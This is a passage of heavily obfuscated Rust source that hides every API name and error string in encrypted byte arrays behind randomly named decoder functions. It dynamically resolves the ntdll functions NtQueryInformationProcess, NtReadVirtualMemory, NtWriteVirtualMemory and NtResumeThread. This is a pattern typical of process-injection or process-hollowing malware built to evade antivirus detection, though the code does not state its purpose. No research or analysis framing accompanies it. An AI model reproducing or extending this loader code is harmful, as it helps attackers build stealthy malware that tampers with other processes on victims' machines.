174 , 171 , 180 , 168 , 114 , 6 , 65 , 183 , 85 , 105 , 226 , 187 , 177 , 127 , 127 , 190 , 224 , 68 , 220 , 88 , 150 , 93 , 60 , 90 , 56 , 26 , 124 , 83 , 62 , 100 , 68 , 77 , 193 , 218 , 114 , 208 , 74 , 71 , 155 , 48 , 145 , 221 , 191 , 4 , 194 , 13 , 239 , 201 , 161 , 110 , 59 , 140 , 218 , 174 , 162 , 206 , 81 , 90 , 234] , & [127 , 217 , 209 , 25 , 114 , 235 , 73 , 84 , 251 , 150 , 229 , 124 , 106 , 147 , 246 , 59 , 122 , 32 , 246 , 18 , 91 , 56 , 241 , 206 , 129 , 74 , 60 , 210 , 248 , 73 , 49 , 99 , 250 , 248 , 29 , 218 , 232 , 108 , 151 , 28 , 85 , 193 , 52 , 102 , 38 , 19 , 154 , 8 , 20 , 93 , 59 , 186 , 24 , 134 , 166 , 120 , 6 , 207 , 209 , 168 , 184 , 253 , 36 , 96 , 2 , 6 , 154 , 239 , 128 , 52 , 68 , 40 , 177 , 144 , 27 , 192 , 126 , 58 , 86 , 207 , 206 , 23 , 216 , 90 , 249 , 115 , 36 , 196] , 23742579213193u64) . as_ptr ()) ; if ntdll == 0 { return Err (decode_nwevfpr_rytds (& [43 , 97 , 132 , 3 , 55 , 93 , 235 , 117 , 79 , 85 , 3 , 125 , 70 , 241 , 128 , 15 , 167 , 61 , 63 , 76 , 17 , 204 , 19 , 11 , 21 , 87 , 7 , 154 , 75 , 122 , 208 , 238 , 148 , 34 , 120 , 17 , 217 , 242 , 249 , 28 , 197 , 207 , 91 , 194 , 123 , 7 , 98 , 20 , 77 , 251 , 79 , 52 , 235 , 109 , 101 , 228 , 98 , 220 , 179 , 176 , 168 , 55 , 145 , 111 , 2 , 17 , 242 , 15 , 34 , 65 , 172 , 90 , 249 , 66 , 126 , 233 , 222 , 115 , 105 , 24 , 22 , 100 , 209 , 207 , 1 , 165 , 197 , 6 , 58 , 64 , 88 , 190 , 149 , 91 , 191 , 236 , 120 , 93 , 128 , 87 , 193 , 105 , 147 , 55 , 67 , 32 , 194 , 135 , 83 , 77 , 247 , 244 , 218 , 124 , 58 , 113 , 37 , 75 , 103 , 55 , 117 , 8 , 88 , 148 , 66 , 54 , 85 , 203 , 138 , 221 , 31 , 169 , 152 , 251 , 60 , 168 , 190 , 194 , 113 , 55 , 160 , 28 , 121 , 170 , 108 , 27 , 215 , 198 , 63 , 204 , 222 , 215 , 202 , 183 , 236 , 70 , 143 , 68 , 235 , 178 , 146 , 17 , 190 , 197 , 105 , 237 , 229 , 92 , 199 , 143 , 99 , 245 , 90 , 171 , 83 , 175 , 62 , 16 , 22 , 182 , 96 , 209 , 147 , 117 , 186 , 238 , 131 , 0 , 221 , 221 , 144 , 176 , 27 , 9 , 221 , 97 , 25 , 7 , 61 , 87 , 138 , 176 , 206 , 134 , 84 , 56 , 214 , 247 , 219 , 177 , 177 , 140 , 110 , 84 , 59 , 248 , 145 , 2 , 13 , 155 , 55 , 11 , 17 , 131 , 153 , 255 , 163 , 125 , 11 , 81 , 174 , 135 , 102 , 209 , 121 , 135 , 205 , 226 , 221 , 154 , 94 , 96 , 160 , 168 , 240 , 253 , 148 , 123 , 119 , 240 , 240 , 22 , 103 , 107 , 56 , 131 , 243 , 204 , 186 , 160 , 138 , 131 , 204 , 213 , 62 , 65 , 112 , 242 , 45 , 122 , 234 , 8 , 79 , 150 , 147 , 58 , 249 , 122 , 212 , 166 , 107 , 156 , 0 , 92 , 39 , 54 , 25 , 16] , & [73 , 65 , 53 , 9 , 253 , 17 , 165 , 75 , 247 , 243 , 244 , 35 , 18 , 158 , 29 , 213 , 156 , 23 , 245 , 23 , 86 , 80 , 109 , 95 , 155 , 253 , 21 , 87 , 77 , 113 , 20 , 98 , 119 , 159 , 213 , 181 , 50 , 54 , 38 , 230 , 105 , 51 , 77 , 119 , 200 , 14 , 53 , 87 , 20 , 28 , 160 , 50 , 194 , 97 , 75 , 42 , 150 , 241 , 44 , 157 , 73 , 99 , 127 , 63 , 204 , 141 , 133 , 150 , 170 , 174 , 246 , 164 , 58 , 74 , 200 , 25 , 134 , 173 , 85 , 100 , 41 , 40 , 150 , 48 , 219 , 7 , 42 , 48] , 117639154239665u64)) ; } let NtQueryInformationProcess = GetProcAddress (ntdll , decode_nwevfpr_rytds (& [100 , 161 , 214 , 166 , 26 , 95 , 102 , 67 , 104 , 195 , 103 , 130 , 73 , 49 , 30 , 225 , 170 , 227 , 32 , 182 , 251 , 16 , 143 , 56 , 239 , 192 , 176 , 3 , 31 , 28 , 151 , 28 , 42 , 84 , 83 , 153 , 155 , 207 , 179 , 135 , 6 , 12 , 104 , 19 , 130 , 108 , 66 , 40 , 244 , 159 , 180 , 122 , 108 , 131 , 83 , 33 , 126 , 235 , 162 , 234 , 109 , 48 , 12 , 65 , 235 , 16 , 204 , 35 , 183 , 0 , 161 , 18 , 127 , 160 , 47 , 92 , 170 , 222 , 12 , 15 , 225 , 73 , 200 , 18 , 22 , 83 , 13 , 14 , 55 , 206 , 249 , 38 , 47 , 22 , 206 , 116 , 121 , 127 , 68 , 3 , 62 , 63 , 201 , 240 , 163 , 218 , 163 , 69 , 1 , 182 , 116 , 147 , 66 , 81 , 39 , 236 , 49 , 208 , 112 , 124 , 86 , 60 , 103 , 4 , 110 , 236 , 104 , 71 , 31 , 68 , 251 , 12 , 131 , 96 , 196 , 15 , 185 , 7 , 88 , 120 , 158 , 96 , 67 , 174 , 101 , 18 , 170 , 199 , 0 , 115 , 28 , 62 , 226 , 87 , 90 , 89 , 132 , 57 , 37 , 175 , 226 , 52 , 240 , 78 , 171 , 120 , 100 , 16 , 219 , 54 , 218 , 251 , 245 , 83 , 16 , 225 , 215 , 153 , 105 , 33 , 251 , 192 , 191 , 91 , 36 , 65 , 33 , 137 , 188 , 105 , 56 , 108 , 38 , 134 , 71 , 120 , 132 , 161 , 197 , 32 , 64 , 234 , 186 , 247 , 94 , 93 , 244 , 210 , 182 , 175 , 208 , 139 , 181 , 146 , 209 , 86 , 93 , 159 , 118 , 96 , 111 , 85 , 108 , 138 , 54 , 74 , 131 , 171 , 4 , 144 , 100 , 181 , 1 , 34 , 66 , 173 , 243 , 224 , 249 , 10 , 104 , 69 , 124 , 157 , 55 , 48 , 161 , 63 , 91 , 215 , 7 , 184 , 160 , 71 , 31 , 62 , 94 , 39 , 144 , 22 , 43 , 137 , 230 , 139 , 237 , 195 , 127 , 225 , 19 , 31 , 125 , 176 , 186 , 179 , 81 , 230 , 143 , 101 , 154 , 106 , 236 , 215 , 82 , 61 , 138 , 211 , 45 , 241 , 160 , 43 , 62 , 207 , 67 , 178 , 232 , 66 , 175 , 198 , 36 , 251 , 79 , 236 , 44 , 162 , 139 , 178 , 146 , 26 , 131 , 222 , 2 , 248 , 171 , 184 , 87 , 95 , 183 , 233 , 249 , 189] , & [136 , 137 , 186 , 12 , 33 , 82 , 83 , 47 , 220 , 107 , 105 , 230 , 196 , 59 , 41 , 157 , 168 , 178 , 15 , 131 , 108 , 163 , 133 , 79 , 0 , 71 , 63 , 192 , 25 , 18 , 190 , 0 , 224 , 223 , 83 , 151 , 11 , 70 , 179 , 219 , 50 , 10 , 165 , 247 , 214 , 154 , 92 , 130 , 192 , 154 , 143 , 248 , 254 , 142 , 147 , 67 , 159 , 225 , 147 , 32 , 151 , 223 , 43 , 180 , 154 , 193 , 165 , 254 , 131 , 240 , 62 , 53 , 199 , 242 , 1 , 9 , 139 , 203 , 96 , 114 , 10 , 71 , 0 , 79 , 56 , 237 , 26 , 18] , 155580895332926u64) . as_ptr ()) ; let NtClose = GetProcAddress (ntdll , decode_nwevfpr_rytds (& [48 , 152 , 233 , 50 , 129 , 20 , 172 , 237 , 42 , 38 , 107 , 253 , 76 , 4 , 225 , 62 , 112 , 216 , 206 , 192 , 74 , 227 , 250 , 116 , 51 , 95 , 78 , 77 , 138 , 231 , 225 , 166 , 215 , 153 , 219 , 4 , 176 , 218 , 147 , 4 , 154 , 51 , 41 , 132 , 154 , 212 , 125 , 248 , 211 , 225 , 253 , 83 , 232 , 50 , 18 , 50 , 182 , 49 , 84 , 58 , 13 , 35 , 7 , 17 , 182 , 90 , 142 , 83 , 116 , 65 , 107 , 245 , 210 , 65 , 234 , 21 , 154 , 106 , 128 , 203 , 137 , 235 , 115 , 204 , 40 , 216 , 180 , 111 , 86 , 160 , 1 , 188 , 66 , 169 , 209 , 198 , 170 , 189 , 98 , 216 , 106 , 211 , 7 , 235 , 242 , 94 , 56 , 125 , 30 , 182 , 196 , 59 , 127 , 63 , 44 , 97 , 103 , 245 , 239 , 255 , 107 , 130 , 250 , 227 , 129 , 253 , 121 , 86] , & [203 , 15 , 91 , 219 , 227 , 39 , 197 , 112 , 130 , 242 , 94 , 127 , 142 , 201 , 232 , 162 , 1 , 151 , 59 , 204 , 20 , 188 , 218 , 228 , 9 , 135 , 129 , 123 , 237 , 79 , 10 , 220 , 17 , 150 , 218 , 83 , 189 , 247 , 162 , 226 , 90 , 120 , 72 , 148 , 156 , 120 , 6 , 160 , 106 , 16 , 72 , 248 , 24 , 150 , 20 , 133 , 243 , 43 , 232 , 179 , 205 , 174 , 208 , 156 , 159 , 236 , 222 , 239 , 194 , 93 , 238 , 8 , 205 , 25 , 166 , 128 , 205 , 110 , 34 , 82 , 127 , 162 , 15 , 193 , 248 , 35 , 227 , 191] , 14504104559289u64) . as_ptr ()) ; let NtReadVirtualMemory = GetProcAddress (ntdll , decode_nwevfpr_rytds (& [169 , 189 , 13 , 181 , 146 , 17 , 95 , 17 , 12 , 240 , 160 , 79 , 168 , 148 , 191 , 97 , 23 , 87 , 95 , 180 , 107 , 127 , 238 , 57 , 216 , 98 , 116 , 116 , 70 , 158 , 254 , 157 , 162 , 182 , 223 , 45 , 48 , 98 , 90 , 62 , 202 , 220 , 244 , 162 , 237 , 104 , 102 , 169 , 46 , 54 , 247 , 240 , 55 , 181 , 19 , 204 , 133 , 58 , 142 , 192 , 215 , 119 , 100 , 66 , 143 , 248 , 93 , 149 , 206 , 103 , 120 , 37 , 1 , 122 , 11 , 198 , 140 , 182 , 129 , 76 , 106 , 124 , 67 , 167 , 151 , 101 , 45 , 132 , 47 , 94 , 245 , 199 , 49 , 186 , 68 , 14 , 106 , 88 , 34 , 242 , 69 , 114 , 248 , 154 , 93 , 144 , 83 , 177 , 175 , 198 , 229 , 72 , 48 , 243 , 193 , 136 , 236 , 25 , 79 , 54 , 208 , 133 , 163 , 233 , 24 , 160 , 194 , 61 , 62 , 209 , 149 , 141 , 115 , 252 , 171 , 151 , 129 , 215 , 66 , 255 , 227 , 102 , 210 , 119 , 240 , 210 , 187 , 255 , 8 , 189 , 145 , 4 , 119 , 200 , 40 , 165 , 232 , 25 , 174 , 149 , 158 , 189 , 118 , 187 , 148 , 102 , 91 , 239 , 202 , 32 , 153 , 197 , 115 , 254 , 43 , 42 , 239 , 228 , 169 , 109 , 28 , 218 , 68 , 83 , 168 , 196 , 29 , 238 , 252 , 26 , 101 , 243 , 49 , 222 , 93 , 85 , 97 , 226 , 41 , 84 , 48 , 183 , 227 , 145 , 171 , 213 , 252 , 90 , 125 , 10 , 110 , 198 , 219 , 26 , 116 , 16 , 23 , 10 , 8 , 119 , 128 , 253 , 54 , 28 , 208 , 253 , 0 , 242 , 86 , 118 , 153 , 49 , 90 , 26 , 239 , 125 , 102 , 178 , 87 , 37 , 208 , 80 , 29 , 204 , 24 , 197 , 140 , 30 , 38 , 208 , 235 , 127 , 100 , 20 , 190 , 87] , & [89 , 62 , 64 , 61 , 146 , 65 , 59 , 21 , 123 , 167 , 211 , 156 , 143 , 237 , 175 , 5 , 132 , 239 , 29 , 226 , 176 , 71 , 83 , 232 , 186 , 43 , 77 , 4 , 172 , 44 , 193 , 52 , 183 , 100 , 162 , 87 , 37 , 112 , 147 , 98 , 30 , 203 , 43 , 248 , 198 , 6 , 85 , 72 , 199 , 226 , 65 , 226 , 11 , 255 , 125 , 80 , 154 , 67 , 238 , 95 , 118 , 177 , 113 , 28 , 232 , 34 , 14 , 179 , 95 , 120 , 27 , 75 , 147 , 44 , 143 , 247 , 218 , 154 , 224 , 41 , 140 , 40 , 100 , 208 , 181 , 173 , 200 , 57] , 89623082567583u64) . as_ptr ()) ; let NtWriteVirtualMemory = GetProcAddress (ntdll , decode_nwevfpr_rytds (& [35 , 241 , 125 , 26 , 79 , 119 , 48 , 107 , 227 , 70 , 31 , 21 , 164 , 194 , 36 , 63 , 186 , 244 , 93 , 85 , 90 , 89 , 173 , 179 , 53 , 190 , 213 , 212 , 157 , 25 , 31 , 89 , 133 , 132 , 59 , 21 , 148 , 204 , 228 , 66 , 121 , 242 , 103 , 170 , 21 , 56 , 161 , 196 , 246 , 215 , 2 , 155 , 151 , 198 , 100 , 176 , 245 , 157 , 174 , 19 , 212 , 54 , 42 , 99 , 96 , 15 , 73 , 168 , 112 , 70 , 248 , 196 , 254 , 7 , 172 , 208 , 228 , 68 , 249 , 55 , 129 , 143 , 162 , 69 , 52 , 247 , 61 , 106 , 5 , 212 , 162 , 26 , 177 , 125 , 96 , 106 , 206 , 234 , 43 , 17 , 46 , 252 , 110 , 117 , 253 , 178 , 16 , 115 , 164 , 38 , 130 , 132 , 141 , 78 , 147 , 204 , 210 , 159 , 82 , 12 , 94 , 47 , 201 , 98 , 188 , 13 , 186 , 209 , 123 , 211 , 97 , 31 , 180 , 24 , 173 , 188 , 53 , 51 , 210 , 61 , 86 , 52 , 140 , 131 , 147 , 29 , 183 , 198 , 161 , 238 , 191 , 7 , 32 , 83 , 80 , 29 , 29 , 208 , 159 , 60 , 109 , 54 , 190 , 128 , 231 , 14 , 25 , 50 , 202 , 25 , 227 , 2 , 244 , 198 , 44 , 176 , 93 , 206 , 162 , 137 , 137 , 194 , 207 , 226 , 99 , 23 , 210 , 244 , 51 , 100 , 117 , 41 , 79 , 38 , 183 , 188 , 236 , 144 , 240 , 244 , 16 , 208 , 11 , 183 , 233 , 250 , 24 , 41 , 210 , 61 , 243 , 100 , 32 , 5 , 255 , 180 , 72 , 173 , 225 , 218 , 58 , 235 , 126 , 121 , 74 , 162 , 171 , 5 , 119 , 220 , 34 , 193 , 53 , 62 , 51 , 63 , 84 , 127 , 244 , 232 , 161 , 105 , 153 , 162 , 59 , 231 , 57 , 152 , 160 , 27 , 102 , 162 , 60 , 212 , 14 , 237] , & [162 , 242 , 136 , 130 , 222 , 16 , 50 , 225 , 1 , 249 , 75 , 115 , 225 , 47 , 44 , 187 , 9 , 161 , 9 , 229 , 129 , 171 , 68 , 216 , 209 , 1 , 126 , 151 , 197 , 24 , 225 , 31 , 243 , 147 , 144 , 181 , 230 , 140 , 208 , 100 , 3 , 101 , 18 , 37 , 118 , 2 , 202 , 39 , 35 , 195 , 224 , 136 , 248 , 136 , 11 , 67 , 254 , 227 , 15 , 181 , 29 , 165 , 40 , 33 , 69 , 106 , 106 , 21 , 27 , 141 , 226 , 86 , 159 , 199 , 66 , 44 , 214 , 170 , 239 , 207 , 61 , 95 , 189 , 71 , 77 , 235 , 160 , 211] , 101696235636782u64) . as_ptr ()) ; let NtResumeThread = GetProcAddress (ntdll , decode_nwevfpr_rytds (& [249 , 220 , 99 , 209 , 58 , 84 , 32 , 252 , 128 , 170 , 204 , 81 , 99 , 169 , 163 , 159 , 209 , 168 , 153 , 196 , 3 , 4 , 117 , 2 , 28 , 56 , 186 , 98 , 60 , 14 , 137 , 63 , 95 , 109 , 111 , 190 , 124 , 121 , 172 , 43 , 103 , 230 , 107 , 77 , 116 , 160 , 4 , 255 , 64 , 116 , 114 , 33 , 23 , 234 , 4 , 228 , 11 , 198 , 143 , 194 , 22 , 66 , 125 , 153 , 100 , 239 , 221 , 21 , 213 , 148 , 148 , 133 , 23 , 164 , 107 , 222 , 183 , 3 , 34 , 94 , 116 , 0 , 153 , 105 , 200 , 126 , 155 , 18 , 134 , 114 , 242 , 205 , 45 , 147 , 35 , 43 , 116 , 51 , 0 , 119 , 113 , 84 , 246 , 210 , 93 , 217 , 241 , 154 , 62 , 181 , 211 , 42 , 231 , 174 , 114 , 121 , 176 , 195 , 78 , 118 , 128 , 194 , 85 , 77 , 22 , 77 , 46 , 142 , 132 , 47 , 24 , 113 , 41 , 32 , 49 , 84 , 194 , 55 , 120 , 163 , 86 , 194 , 116 , 199 , 34 , 95 , 71 , 196 , 14 , 122 , 191 , 17 , 25 , 120 , 104 , 176 , 162 , 219 , 215 , 159 , 234 , 182 , 65 , 148 , 31 , 209 , 15 , 72 , 197 , 198 , 41 , 119 , 101 , 171 , 180 , 137 , 182 , 44 , 224 , 155 , 194 , 65 , 193 , 199 , 169 , 38 , 13 , 132 , 19 , 90 , 106 , 65] , & [251 , 141 , 53 , 106 , 69 , 202 , 6 , 170 , 120 , 119 , 150 , 254 , 26 , 169 , 248 , 102 , 178 , 11 , 226 , 82 , 98 , 103 , 135 , 228 , 100 , 255 , 48 , 40 , 75 , 250 , 182 , 127 , 190 , 202 , 90 , 150 , 149 , 167 , 214 , 141 , 212 , 25 , 191 , 33 , 111 , 120 , 15 , 255 , 67 , 133 , 177 , 5 , 0 , 117 , 244 , 243 , 184 , 218 , 168 , 160 , 40 , 101 , 88 , 144 , 210 , 184 , 30 , 86 , 83 , 239 , 90 , 186 , 66 , 213 , 27 , 118 , 227 , 108 , 26 , 147 , 232 , 62 , 141 , 106 , 82 , 107 , 174 , 35] , 51488067945868u64) . as_ptr ()) ; if NtQueryInformationProcess . is_none () || NtClose . is_none () || NtReadVirtualMemory . is_none () || NtWriteVirtualMemory . is_none () || NtResumeThread . is_none () { return Err (decode_nwevfpr_rytds (& [37 , 250 , 171 , 231 , 65 , 89 , 187 , 96 , 155 , 184 , 126 , 34 , 209 , 239 , 134 , 6 , 16 , 205 , 239 , 68 , 106 , 80 , 0 , 241 , 194 , 229 , 84 , 44 , 124 , 185 , 111 , 86 , 193 , 246 , 239 , 166 , 202 , 144 , 176 , 110 , 143 , 211 , 206 , 226 , 156 , 81 , 24 , 194 , 184 , 43 , 241 , 212 , 164 , 95 , 218 , 181 , 230 , 8 , 96 , 79 , 61 , 209 , 173 , 91 , 74 , 137 , 186 , 52 , 123 , 66 , 6 , 96 , 77 , 98 , 115 , 140 , 8 , 52 , 63 , 37 , 202 , 186 , 178 , 245 , 146 , 58 , 38 , 210 , 56 , 150 , 234 , 240 , 127 , 212 , 22 , 234 , 150 , 2 , 68 , 152 , 177 , 49 , 187 , 30 , 165 , 61 , 244 , 125 , 154 , 60 , 33 , 54 , 220 , 52 , 194 , 203 , 82 , 216 , 254 , 246 , 146 , 2 , 91 , 3 , 75 , 104 , 83 , 196 , 194 , 203 , 47 , 178 , 168 , 254 , 45 , 7 , 3 , 171 , 103 , 235 , 22 , 184 , 59 , 196 , 235 , 205 , 14 , 94 , 188 , 157 , 40 , 108 , 3 , 113 , 116 , 103 , 205 , 95 , 216 , 202 , 161 , 19 , 143 , 88 , 104 , 85 , 127 , 5 , 59 , 186 , 205 , 8 , 122 , 32 , 214 , 212 , 247 , 231 , 20 , 182 , 82 , 200 , 211 , 70 , 6 , 216 , 245 , 139 , 24 , 13 , 205 , 26 , 128 , 151 , 241 , 208 , 26 , 17 , 114 , 228 , 190 , 214 , 88 , 232 , 172 , 84 , 54 , 142 , 90 , 226 , 200 , 42 , 199 , 85 , 218 , 183 , 244 , 217 , 228 , 133 , 205 , 116 , 191 , 174 , 151 , 133 , 141 , 175 , 202 , 199 , 238 , 18 , 18 , 116 , 5 , 102 , 72 , 162 , 192 , 243 , 254 , 184 , 40 , 239 , 96 , 196 , 57 , 28 , 3 , 175 , 57 , 152 , 145 , 8 , 1 , 68 , 232 , 238 , 240 , 95 , 92 , 215 , 132 , 121 , 198 , 254 , 50 , 61 , 225 , 82 , 30 , 152 , 214 , 12 , 14 , 155 , 3 , 225 , 62 , 71 , 119 , 56 , 173 , 130 , 30 , 213 , 224 , 142 , 21 , 66 , 9 , 13 , 38 , 6 , 69 , 13 , 238 , 157 , 225 , 52 , 21 , 210 , 172 , 87 , 20 , 248 , 51 , 79 , 175 , 194 , 63 , 255 , 81 , 82 , 225 , 152 , 85 , 209 , 198 , 124 , 14 , 224 , 167 , 1 , 62 , 246 , 168 , 95 , 20 , 45 , 204 , 220 , 235 , 84 , 41 , 163 , 247 , 223 , 225 , 136 , 13 , 162 , 9 , 77 , 94 , 177 , 233 , 162 , 252 , 95 , 240 , 253 , 209 , 182 , 255 , 10 , 103 , 86 , 250 , 146 , 133 , 78 , 30 , 27 , 149 , 221 , 221 , 37 , 228 , 140 , 58 , 76 , 37 , 137 , 131 , 115 , 133 , 223 , 225 , 132 , 121 , 175 , 110 , 218 , 52 , 144 , 139 , 203 , 105 , 211 , 119 , 37 , 90 , 13 , 28 , 227 , 32 , 57 , 10 , 1 , 211 , 112 , 159 , 12 , 208 , 164 , 122 , 106 , 223 , 86 , 163 , 189 , 50 , 191 , 3 , 231 , 171 , 42 , 191 , 3 , 88 , 91 , 170 , 99 , 184 , 24 , 249 , 193 , 69 , 67 , 175 , 176 , 55 , 157 , 219 , 192 , 253 , 91 , 145 , 87 , 99 , 221 , 147 , 163 , 105 , 186 , 86 , 194 , 69 , 93 , 27 , 232 , 140 , 133 , 209 , 113 , 152 , 200 , 29 , 101 , 224 , 143 , 49 , 213 , 184 , 94 , 126 , 88 , 2 , 196 , 15 , 87 , 220 , 237 , 84 , 32 , 153 , 38 , 64 , 134 , 93 , 161 , 179 , 173 , 224 , 213 , 159 , 234 , 221 , 59 , 123 , 177 , 10 , 151 , 57 , 175 , 111 , 180 , 5 , 43 , 169 , 6 , 72 , 76 , 136 , 116 , 93 , 35 , 204 , 19 , 2 , 9] , & [140 , 63 , 162 , 96 , 158 , 2 , 132 , 215 , 25 , 220 , 244 , 22 , 34 , 213 , 91 , 187 , 152 , 240 , 235 , 232 , 20 , 144 , 87 , 105 , 169 , 163 , 142 , 163 , 231 , 136 , 231 , 119 , 174 , 173 , 22 , 228 , 154 , 33 , 167 , 54 , 188 , 125 , 54 , 30 , 61 , 172 , 55 , 39 , 62 , 49 , 102 , 21 , 5 , 43 , 10 , 158 , 1 , 46 , 115 , 112 , 236 , 73 , 148 , 154 , 129 , 32 , 154 , 166 , 242 , 28 , 166 , 245 , 239 , 55 , 245 , 185 , 191 , 119 , 249 , 3 , 130 , 167 , 53 , 201 , 193 , 212 , 81 , 106] , 107404247175235u64)) ; } Ok (Syscalls { NtQueryInformationProcess : transmute (NtQueryInformationProcess . unwrap ()) , NtClose : transmute (NtClose . unwrap ()) , NtReadVirtualMemory : transmute (NtReadVirtualMemory . unwrap ()) , NtWriteVirtualMemory : transmute (NtWriteVirtualMemory . unwrap ()) , NtResumeThread : transmute (NtResumeThread . unwrap ()) , }) } } } pub static jp_aqhg_at : Lazy < Syscalls > = Lazy :: new (| | { Syscalls :: new () . expect ("") }) ;
fn main() { dyksrqsh(); }